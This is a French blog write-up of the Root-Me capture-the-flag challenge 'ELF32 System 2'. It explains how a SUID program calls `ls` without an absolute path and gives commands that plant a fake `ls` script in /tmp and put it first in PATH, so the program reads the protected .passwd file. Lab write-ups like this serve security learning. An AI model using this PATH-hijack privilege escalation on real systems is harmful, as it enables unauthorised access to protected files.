---
title: "RootMe App-Script/Bash-System-2"
seoTitle: "RootMe App-Script/Bash-System-2"
datePublished: Mon Jun 09 2025 22:49:08 GMT+0000 (Coordinated Universal Time)
cuid: cmbpop0sd000102l5h9ns2pan
slug: rootme-app-scriptbash-system-2
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1749504538459/36c14397-4060-42a6-8c24-02584a9f4010.png
tags: bash, cybersecurity-1, shell-script, root-me

---

Lien : [https://www.root-me.org/fr/Challenges/App-Script/ELF32-System-2](https://www.root-me.org/fr/Challenges/App-Script/ELF32-System-2)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1749505028969/8161ee5c-7590-496b-853f-cb2c6b78550e.png align="center")

On veut pouvoir lire le mot de passe du fichier `.passwd` mais il n’est lisible que par le propriétaire du fichier `app-script-ch12-cracked`.

Le code source de `ch12.c` utilise la fonction `system()` pour lister le répertoire du fichier `.passwd`. Par contre la commande `ls` est appelée dans la fonction `system()` sans spécifier le chemin absolu, c’est-à-dire `/bin/ls`. Puisque le fichier `ch12` a le binaire SUID activé, il peut s’exécuter avec les droits du propriétaire. Quand la commande `ls` sera exécutée par la commande `system()`, le shell regardera au niveau des variables d’environnement PATH puis cherche la commande `ls` dans les répertoires. La commande qu’on aura manipulé sera donc exécutée à la place.

Créér le répertoire dans /tmp/script

```bash
mkdir /tmp/script
nano /tmp/script/ls
```

Écrire ensuite le script pour lire le fichier `.passwd`.

```bash
#!/bin/bash
cat /challenge/app-script/ch12/.passwd
```

Rendre le script ls exécutable

```bash
chmod +x /tmp/script/ls
```

Modifier la variable d’environnement PATH pour inclure notre script

```bash
export PATH=/tmp/script:$PATH
```

En vérifiant avec la command `which ls`, on voit que que le script est bien trouvé avant la commande ls.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1749509148631/6dd13ac1-3b25-4e01-800c-c3d9d4bc464c.png align="center")

On peut maintenant lire le fichier.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1749509071532/4f6bdf63-3c6c-4555-81b5-548700be846c.png align="center")